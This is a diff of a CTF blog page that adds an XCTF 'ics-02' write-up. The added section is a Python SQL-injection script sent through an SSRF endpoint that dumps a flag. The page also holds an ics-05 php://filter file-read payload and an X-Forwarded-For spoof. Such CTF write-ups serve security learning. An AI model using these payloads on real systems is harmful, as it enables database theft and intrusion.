@@ -10,9 +10,15 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="H3ng,"> 
-    <meta name="description" content="ics-05dirsearch扫描出index.php/login
-进入有个?page
-php://filter/read=convert.base64-encode/resource=index.,"> 
+    <meta name="description" content="ics-02
+
+
+sql注入：
+import requests
+import random
+import urllib
+
+url = &#39;http://111.198.29.45:52536/down,"> 
     <meta name="author" content="H3ng"> 
     <link rel="alternative" href="/atom.xml" title="H3ng" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -56,10 +62,48 @@ php://filter/read=convert.base64-encode/resource=index.,">
 
         </div>
         <div class="content markdown">
-            <h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>dirsearch扫描出index.php/login</p>
+            <h1 id="ics-02"><a href="#ics-02" class="headerlink" title="ics-02"></a>ics-02</h1><p><img src="/2021/10/21/xctf-web-ics/image-20211021194840915.png" alt="image-20211021194840915"></p>
+<p><img src="/2021/10/21/xctf-web-ics/image-20211021194859118.png" alt="image-20211021194859118"></p>
+<p><img src="/2021/10/21/xctf-web-ics/image-20211021194916590.png" alt="image-20211021194916590"></p>
+<p><strong>sql注入：</strong></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> urllib
+
+url <span class="token operator">=</span> <span class="token string">'http://111.198.29.45:52536/download.php'</span>
+
+<span class="token comment" spellcheck="true"># subquery = "database()"</span>
+<span class="token comment" spellcheck="true"># ssrfw</span>
+<span class="token comment" spellcheck="true"># subquery = "select table_name from information_schema.tables where table_schema='ssrfw' LIMIT 1"</span>
+<span class="token comment" spellcheck="true"># cetcYssrf</span>
+<span class="token comment" spellcheck="true"># subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1"</span>
+<span class="token comment" spellcheck="true"># secretname -> flag</span>
+<span class="token comment" spellcheck="true"># subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1, 1"</span>
+<span class="token comment" spellcheck="true"># value -> flag{cpg9ssnu_OOOOe333eetc_2018}</span>
+subquery <span class="token operator">=</span> <span class="token string">"select value from cetcYssrf LIMIT 1"</span>
+
+id <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000000</span><span class="token punctuation">)</span>
+
+d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/secret/secret_debug.php?'</span> <span class="token operator">+</span>
+        urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>
+            <span class="token string">"s"</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span>
+            <span class="token string">"txtfirst_name"</span><span class="token punctuation">:</span> <span class="token string">"L','1',("</span><span class="token operator">+</span>subquery<span class="token operator">+</span><span class="token string">"),'1'/*"</span><span class="token punctuation">,</span>
+            <span class="token string">"txtmiddle_name"</span><span class="token punctuation">:</span> <span class="token string">"m"</span><span class="token punctuation">,</span>
+            <span class="token string">"txtLast_name"</span><span class="token punctuation">:</span> <span class="token string">"y"</span><span class="token punctuation">,</span>
+            <span class="token string">"txtname_suffix"</span><span class="token punctuation">:</span> <span class="token string">"Esq."</span><span class="token punctuation">,</span>
+            <span class="token string">"txtdob"</span><span class="token punctuation">:</span> <span class="token string">"*/,'01/10/2019"</span><span class="token punctuation">,</span>
+            <span class="token string">"txtdl_nmbr"</span><span class="token punctuation">:</span> id<span class="token punctuation">,</span>
+            <span class="token string">"txtRetypeDL"</span><span class="token punctuation">:</span> id
+            <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;"</span><span class="token punctuation">)</span>
+
+
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"dl"</span><span class="token punctuation">:</span> d<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+</code></pre>
+<h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>dirsearch扫描出index.php/login</p>
 <p>进入有个?page</p>
 <pre><code>php://filter/read=convert.base64-encode/resource=index.php</code></pre>
-<p>index.php:****</p>
+<p><strong>index.php:</strong></p>
 <pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token keyword">echo</span> <span class="token string">"&lt;br >Welcome My Admin ! &lt;br >"</span><span class="token punctuation">;</span>
 
@@ -121,7 +165,7 @@ php://filter/read=convert.base64-encode/resource=index.,">
     </div>
     
         <div class='side'>
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-05"><span class="toc-number">1.</span> <span class="toc-text">ics-05</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-06"><span class="toc-number">2.</span> <span class="toc-text">ics-06</span></a></li></ol>	
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-02"><span class="toc-number">1.</span> <span class="toc-text">ics-02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-05"><span class="toc-number">2.</span> <span class="toc-text">ics-05</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-06"><span class="toc-number">3.</span> <span class="toc-text">ics-06</span></a></li></ol>	
         </div>
     
 </div>
